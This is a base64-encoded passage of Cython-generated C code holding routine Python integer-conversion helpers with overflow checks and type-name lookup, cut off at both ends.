ICAgICB9XG4gICAgICAgIH1cbiNlbmRpZlxuICAgICAgICBpZiAoKHNpemVvZihsb25nKSA8PSBzaXplb2YobG9uZykpKSB7XG4gICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVF9FWEMobG9uZywgbG9uZywgUHlMb25nX0FzTG9uZyh4KSlcbiNpZmRlZiBIQVZFX0xPTkdfTE9OR1xuICAgICAgICB9IGVsc2UgaWYgKChzaXplb2YobG9uZykgPD0gc2l6ZW9mKFBZX0xPTkdfTE9ORykpKSB7XG4gICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVF9FWEMobG9uZywgUFlfTE9OR19MT05HLCBQeUxvbmdfQXNMb25nTG9uZyh4KSlcbiNlbmRpZlxuICAgICAgICB9XG4gICAgfVxuICAgIHtcbiAgICAgICAgbG9uZyB2YWw7XG4gICAgICAgIGludCByZXQgPSAtMTtcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMEE2ICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgICAgIFB5X3NzaXplX3QgYnl0ZXNfY29waWVkID0gUHlMb25nX0FzTmF0aXZlQnl0ZXMoXG4gICAgICAgICAgICB4LCAmdmFsLCBzaXplb2YodmFsKSwgUHlfQVNOQVRJVkVCWVRFU19OQVRJVkVfRU5ESUFOIHwgKGlzX3Vuc2lnbmVkID8gUHlfQVNOQVRJVkVCWVRFU19VTlNJR05FRF9CVUZGRVIgfCBQeV9BU05BVElWRUJZVEVTX1JFSkVDVF9ORUdBVElWRSA6IDApKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KGJ5dGVzX2NvcGllZCA9PSAtMSkpIHtcbiAgICAgICAgfSBlbHNlIGlmICh1bmxpa2VseShieXRlc19jb3BpZWQgPiAoUHlfc3NpemVfdCkgc2l6ZW9mKHZhbCkpKSB7XG4gICAgICAgICAgICBnb3RvIHJhaXNlX292ZXJmbG93O1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgcmV0ID0gMDtcbiAgICAgICAgfVxuI2VsaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMGQwMDAwICYmICEoQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkpIHx8IGRlZmluZWQoX1B5TG9uZ19Bc0J5dGVBcnJheSlcbiAgICAgICAgaW50IG9uZSA9IDE7IGludCBpc19saXR0bGUgPSAoaW50KSoodW5zaWduZWQgY2hhciAqKSZvbmU7XG4gICAgICAgIHVuc2lnbmVkIGNoYXIgKmJ5dGVzID0gKHVuc2lnbmVkIGNoYXIgKikmdmFsO1xuICAgICAgICByZXQgPSBfUHlMb25nX0FzQnl0ZUFycmF5KChQeUxvbmdPYmplY3QgKil4LFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnl0ZXMsIHNpemVvZih2YWwpLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaXNfbGl0dGxlLCAhaXNfdW5zaWduZWQpO1xuI2Vsc2VcbiAgICAgICAgUHlPYmplY3QgKnY7XG4gICAgICAgIFB5T2JqZWN0ICpzdGVwdmFsID0gTlVMTCwgKm1hc2sgPSBOVUxMLCAqc2hpZnQgPSBOVUxMO1xuICAgICAgICBpbnQgYml0cywgcmVtYWluaW5nX2JpdHMsIGlzX25lZ2F0aXZlID0gMDtcbiAgICAgICAgaW50IGNodW5rX3NpemUgPSAoc2l6ZW9mKGxvbmcpIDwgOCkgPyAzMCA6IDYyO1xuICAgICAgICBpZiAobGlrZWx5KFB5TG9uZ19DaGVja0V4YWN0KHgpKSkge1xuICAgICAgICAgICAgdiA9IF9fUHl4X05ld1JlZih4KTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIHYgPSBQeU51bWJlcl9Mb25nKHgpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCF2KSkgcmV0dXJuIChsb25nKSAtMTtcbiAgICAgICAgICAgIGFzc2VydChQeUxvbmdfQ2hlY2tFeGFjdCh2KSk7XG4gICAgICAgIH1cbiAgICAgICAge1xuICAgICAgICAgICAgaW50IHJlc3VsdCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlQm9vbCh2LCBQeV9GYWxzZSwgUHlfTFQpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KHJlc3VsdCA8IDApKSB7XG4gICAgICAgICAgICAgICAgUHlfREVDUkVGKHYpO1xuICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgLTE7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBpc19uZWdhdGl2ZSA9IHJlc3VsdCA9PSAxO1xuICAgICAgICB9XG4gICAgICAgIGlmIChpc191bnNpZ25lZCAmJiB1bmxpa2VseShpc19uZWdhdGl2ZSkpIHtcbiAgICAgICAgICAgIFB5X0RFQ1JFRih2KTtcbiAgICAgICAgICAgIGdvdG8gcmFpc2VfbmVnX292ZXJmbG93O1xuICAgICAgICB9IGVsc2UgaWYgKGlzX25lZ2F0aXZlKSB7XG4gICAgICAgICAgICBzdGVwdmFsID0gUHlOdW1iZXJfSW52ZXJ0KHYpO1xuICAgICAgICAgICAgUHlfREVDUkVGKHYpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFzdGVwdmFsKSlcbiAgICAgICAgICAgICAgICByZXR1cm4gKGxvbmcpIC0xO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgc3RlcHZhbCA9IHY7XG4gICAgICAgIH1cbiAgICAgICAgdiA9IE5VTEw7XG4gICAgICAgIHZhbCA9IChsb25nKSAwO1xuICAgICAgICBtYXNrID0gUHlMb25nX0Zyb21Mb25nKCgxTCA8PCBjaHVua19zaXplKSAtIDEpOyBpZiAodW5saWtlbHkoIW1hc2spKSBnb3RvIGRvbmU7XG4gICAgICAgIHNoaWZ0ID0gUHlMb25nX0Zyb21Mb25nKGNodW5rX3NpemUpOyBpZiAodW5saWtlbHkoIXNoaWZ0KSkgZ290byBkb25lO1xuICAgICAgICBmb3IgKGJpdHMgPSAwOyBiaXRzIDwgKGludCkgc2l6ZW9mKGxvbmcpICogOCAtIGNodW5rX3NpemU7IGJpdHMgKz0gY2h1bmtfc2l6ZSkge1xuICAgICAgICAgICAgUHlPYmplY3QgKnRtcCwgKmRpZ2l0O1xuICAgICAgICAgICAgbG9uZyBpZGlnaXQ7XG4gICAgICAgICAgICBkaWdpdCA9IFB5TnVtYmVyX0FuZChzdGVwdmFsLCBtYXNrKTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghZGlnaXQpKSBnb3RvIGRvbmU7XG4gICAgICAgICAgICBpZGlnaXQgPSBQeUxvbmdfQXNMb25nKGRpZ2l0KTtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihkaWdpdCk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoaWRpZ2l0IDwgMCkpIGdvdG8gZG9uZTtcbiAgICAgICAgICAgIHZhbCB8PSAoKGxvbmcpIGlkaWdpdCkgPDwgYml0cztcbiAgICAgICAgICAgIHRtcCA9IFB5TnVtYmVyX1JzaGlmdChzdGVwdmFsLCBzaGlmdCk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIXRtcCkpIGdvdG8gZG9uZTtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihzdGVwdmFsKTsgc3RlcHZhbCA9IHRtcDtcbiAgICAgICAgfVxuICAgICAgICBQeV9ERUNSRUYoc2hpZnQpOyBzaGlmdCA9IE5VTEw7XG4gICAgICAgIFB5X0RFQ1JFRihtYXNrKTsgbWFzayA9IE5VTEw7XG4gICAgICAgIHtcbiAgICAgICAgICAgIGxvbmcgaWRpZ2l0ID0gUHlMb25nX0FzTG9uZyhzdGVwdmFsKTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShpZGlnaXQgPCAwKSkgZ290byBkb25lO1xuICAgICAgICAgICAgcmVtYWluaW5nX2JpdHMgPSAoKGludCkgc2l6ZW9mKGxvbmcpICogOCkgLSBiaXRzIC0gKGlzX3Vuc2lnbmVkID8gMCA6IDEpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KGlkaWdpdCA+PSAoMUwgPDwgcmVtYWluaW5nX2JpdHMpKSlcbiAgICAgICAgICAgICAgICBnb3RvIHJhaXNlX292ZXJmbG93O1xuICAgICAgICAgICAgdmFsIHw9ICgobG9uZykgaWRpZ2l0KSA8PCBiaXRzO1xuICAgICAgICB9XG4gICAgICAgIGlmICghaXNfdW5zaWduZWQpIHtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSh2YWwgJiAoKChsb25nKSAxKSA8PCAoc2l6ZW9mKGxvbmcpICogOCAtIDEpKSkpXG4gICAgICAgICAgICAgICAgZ290byByYWlzZV9vdmVyZmxvdztcbiAgICAgICAgICAgIGlmIChpc19uZWdhdGl2ZSlcbiAgICAgICAgICAgICAgICB2YWwgPSB+dmFsO1xuICAgICAgICB9XG4gICAgICAgIHJldCA9IDA7XG4gICAgZG9uZTpcbiAgICAgICAgUHlfWERFQ1JFRihzaGlmdCk7XG4gICAgICAgIFB5X1hERUNSRUYobWFzayk7XG4gICAgICAgIFB5X1hERUNSRUYoc3RlcHZhbCk7XG4jZW5kaWZcbiAgICAgICAgaWYgKHVubGlrZWx5KHJldCkpXG4gICAgICAgICAgICByZXR1cm4gKGxvbmcpIC0xO1xuICAgICAgICByZXR1cm4gdmFsO1xuICAgIH1cbnJhaXNlX292ZXJmbG93OlxuICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19PdmVyZmxvd0Vycm9yLFxuICAgICAgICAidmFsdWUgdG9vIGxhcmdlIHRvIGNvbnZlcnQgdG8gbG9uZyIpO1xuICAgIHJldHVybiAobG9uZykgLTE7XG5yYWlzZV9uZWdfb3ZlcmZsb3c6XG4gICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX092ZXJmbG93RXJyb3IsXG4gICAgICAgICJjYW5cJ3QgY29udmVydCBuZWdhdGl2ZSB2YWx1ZSB0byBsb25nIik7XG4gICAgcmV0dXJuIChsb25nKSAtMTtcbn1cblxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBkMDAwMFxuc3RhdGljIF9fUHl4X1R5cGVOYW1lXG5fX1B5eF9QeVR5cGVfR2V0RnVsbHlRdWFsaWZpZWROYW1lKFB5VHlwZU9iamVjdCogdHApXG57XG4gICAgUHlPYmplY3QgKm1vZHVsZSA9IE5VTEwsICpuYW1lID0gTlVMTCwgKnJlc3VsdCA9IE5VTEw7XG4gICAgI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMGIwMDAwXG4gICAgbmFtZSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoKFB5T2JqZWN0ICopdHAsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9xdWFsbmFtZSk7XG4gICAgI2Vsc2VcbiAgICBuYW1lID0gUHlUeXBlX0dldFF1YWxOYW1lKHRwKTtcbiAgICAjZW5kaWZcbiAgICBpZiAodW5saWtlbHkobmFtZSA9PSBOVUxMKSB8fCB1bmxpa2VseSghUHlVbmljb2RlX0NoZWNrKG5hbWUpKSkgZ290byBiYWQ7XG4gICAgbW9kdWxlID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cigoUHlPYmplY3QgKil0cCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X21vZHVsZSk7XG4gICAgaWYgKHVubGlrZWx5KG1vZHVsZSA9PSBOVUxMKSB8fCB1bmxpa2VseSghUHlVbmljb2RlX0NoZWNrKG1vZHVsZSkpKSBnb3RvIGJhZDtcbiAgICBpZiAoUHlVbmljb2RlX0NvbXBhcmVXaXRoQVNDSUlTdHJpbmcobW9kdWxlLCAiYnVpbHRpbnMiKSA9PSAwKSB7XG4gICAgICAgIHJlc3VsdCA9IG5hbWU7XG4gICAgICAgIG5hbWUgPSBOVUxMO1xuICAgICAgICBnb3RvIGRvbmU7XG4gICAgfVxuICAgIHJlc3VsdCA9IFB5VW5pY29kZV9Gcm9tRm9ybWF0KCIlVS4lVSIsIG1vZHVsZSwgbmFtZSk7XG4gICAgaWYgKHVubGlrZWx5KHJlc3VsdCA9PSBOVUxMKSkgZ290byBiYWQ7XG4gIGRvbmU6XG4gICAgUHlfWERFQ1JFRihuYW1lKTtcbiAgICBQeV9YREVDUkVGKG1vZHVsZSk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbiAgYmFkOlxuICAgIFB5RXJyX0NsZWFyKCk7XG4gICAgaWYgKG5hbWUpIHtcbiAgICAgICAgcmVzdWx0ID0gbmFtZTtcbiAgICAgICAgbmFtZSA9IE5VTEw7XG4gICAgfSBlbHNlIHtcbiAgICAgICAgcmVzdWx0ID0gX19QeXhfTmV3UmVmKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzE3KTtcbiAgICB9XG4gICAgZ290byBkb25lO1xufVxuI2VuZGlmXG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5TG9uZ19Bc19pbnQoUHlPYmplY3QgKngpIHtcbiNpZmRlZiBfX1B5eF9IQVNfR0NDX0RJQUdOT1NUSUNcbiNwcmFnbWEgR0NDIGRpYWdub3N0aWMgcHVzaFxuI3ByYWdtYSBHQ0MgZGlhZ25vc3RpYyBpZ25vcmVkICItV2NvbnZlcnNpb24iXG4jZW5kaWZcbiAgICBjb25zdCBpbnQgbmVnX29uZSA9IChpbnQpIC0xLCBjb25zdF96ZXJvID0gKGludCkgMDtcbiNpZmRlZiBfX1B5eF9IQVNfR0NDX0RJQUdOT1NUSUNcbiNwcmFnbWEgR0NDIGRpYWdub3N0aWMgcG9wXG4jZW5kaWZcbiAgICBjb25zdCBpbnQgaXNfdW5zaWduZWQgPSBuZWdfb25lID4gY29uc3RfemVybztcbiAgICBpZiAodW5saWtlbHkoIVB5TG9uZ19DaGVjayh4KSkpIHtcbiAgICAgICAgaW50IHZhbDtcbiAgICAgICAgUHlPYmplY3QgKnRtcCA9IF9fUHl4X1B5TnVtYmVyX0xvbmcoeCk7XG4gICAgICAgIGlmICghdG1wKSByZXR1cm4gKGludCkgLTE7XG4gICAgICAgIHZhbCA9IF9fUHl4X1B5TG9uZ19Bc19pbnQodG1wKTtcbiAgICAgICAgUHlfREVDUkVGKHRtcCk7XG4gICAgICAgIHJldHVybiB2YWw7XG4gICAgfVxuICAgIGlmIChpc191bnNpZ25lZCkge1xuI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMU1xuICAgICAgICBpZiAodW5saWtlbHkoX19QeXhfUHlMb25nX0lzTmVnKHgpKSkge1xuICAgICAgICAgICAgZ290byByYWlzZV9uZWdfb3ZlcmZsb3c7XG4gICAgICAgIH0gZWxzZSBpZiAoX19QeXhfUHlMb25nX0lzQ29tcGFjdCh4KSkge1xuICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQoaW50LCBfX1B5eF9jb21wYWN0X3VweWxvbmcsIF9fUHl4X1B5TG9uZ19Db21wYWN0VmFsdWVVbnNpZ25lZCh4KSlcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIGNvbnN0IGRpZ2l0KiBkaWdpdHMgPSBfX1B5eF9QeUxvbmdfRGlnaXRzKHgpO1xuICAgICAgICAgICAgYXNzZXJ0KF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KHgpID4gMSk7XG4gICAgICAgICAgICBzd2l0Y2ggKF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KHgpKSB7XG4gICAgICAgICAgICAgICAgY2FzZSAyOlxuICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSA+IDEgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAyICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGludCwgdW5zaWduZWQgbG9uZywgKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKVxuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihpbnQpID49IDIgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpICgoKCgoaW50KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgY2FzZSAzOlxuICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAzICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGludCwgdW5zaWduZWQgbG9uZywgKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGludCkgPj0gMyAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgKCgoKCgoKGludClkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgY2FzZSA0OlxuICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiA0ICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGludCwgdW5zaWduZWQgbG9uZywgKCgoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSlcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YoaW50KSA+PSA0ICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAoaW50KSAoKCgoKCgoKChpbnQpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiNlbmRpZlxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQzAwQTdcbiAgICAgICAgaWYgKHVubGlrZWx5KFB5X1NJWkUoeCkgPCAwKSkge1xuICAgICAgICAgICAgZ290byByYWlzZV9uZWdfb3ZlcmZsb3c7XG4gICAgICAgIH1cbiNlbHNlXG4gICAgICAgIHtcbiAgICAgICAgICAgIGludCByZXN1bHQgPSBQeU9iamVjdF9SaWNoQ29tcGFyZUJvb2woeCwgUHlfRmFsc2UsIFB5X0xUKTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShyZXN1bHQgPCAwKSlcbiAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgLTE7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkocmVzdWx0ID09IDEpKVxuICAgICAgICAgICAgICAgIGdvdG8gcmFpc2VfbmVnX292ZXJmbG93O1xuICAgICAgICB9XG4jZW5kaWZcbiAgICAgICAgaWYgKChzaXplb2YoaW50KSA8PSBzaXplb2YodW5zaWduZWQgbG9uZykpKSB7XG4gICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVF9FWEMoaW50LCB1bnNpZ25lZCBsb25nLCBQeUxvbmdfQXNVbnNpZ25lZExvbmcoeCkpXG4jaWZkZWYgSEFWRV9MT05HX0xPTkdcbiAgICAgICAgfSBlbHNlIGlmICgoc2l6ZW9mKGludCkgPD0gc2l6ZW9mKHVuc2lnbmVkIFBZX0xPTkdfTE9ORykpKSB7XG4gICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVF9FWEMoaW50LCB1bnNpZ25lZCBQWV9MT05HX0xPTkcsIFB5TG9uZ19Bc1Vuc2lnbmVkTG9uZ0xvbmcoeCkpXG4jZW5kaWZcbiAgICAgICAgfVxuICAgIH0gZWxzZSB7XG4jaWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTXG4gICAgICAgIGlmIChfX1B5eF9QeUxvbmdfSXNDb21wYWN0KHgpKSB7XG4gICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChpbnQsIF9fUHl4X2NvbXBhY3RfcHlsb25nLCBfX1B5eF9QeUxvbmdfQ29tcGFjdFZhbHVlKHgpKVxuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgY29uc3QgZGlnaXQqIGRpZ2l0cyA9IF9fUHl4X1B5TG9uZ19EaWdpdHMoeCk7XG4gICAgICAgICAgICBhc3NlcnQoX19QeXhfUHlMb25nX0RpZ2l0Q291bnQoeCkgPiAxKTtcbiAgICAgICAgICAgIHN3aXRjaCAoX19QeXhfUHlMb25nX1NpZ25lZERpZ2l0Q291bnQoeCkpIHtcbiAgICAgICAgICAgICAgICBjYXNlIC0yOlxuICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSAtIDEgPiAxICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gMiAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChpbnQsIGxvbmcsIC0obG9uZykgKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKVxuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihpbnQpIC0gMSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpICgoKGludCktMSkqKCgoKChpbnQpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMF0pKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgY2FzZSAyOlxuICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSA+IDEgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAyICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGludCwgdW5zaWduZWQgbG9uZywgKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKVxuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihpbnQpIC0gMSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpICgoKCgoKGludClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1swXSkpKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICBjYXNlIC0zOlxuICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSAtIDEgPiAyICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gMyAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChpbnQsIGxvbmcsIC0obG9uZykgKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGludCkgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgKCgoaW50KS0xKSooKCgoKCgoaW50KWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMF0pKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgY2FzZSAzOlxuICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAzICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGludCwgdW5zaWduZWQgbG9uZywgKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpXG4gICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGludCkgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgKCgoKCgoKChpbnQpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1swXSkpKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICBjYXNlIC00OlxuICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSAtIDEgPiAzICogUHlMb25nX1NISUZUKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbm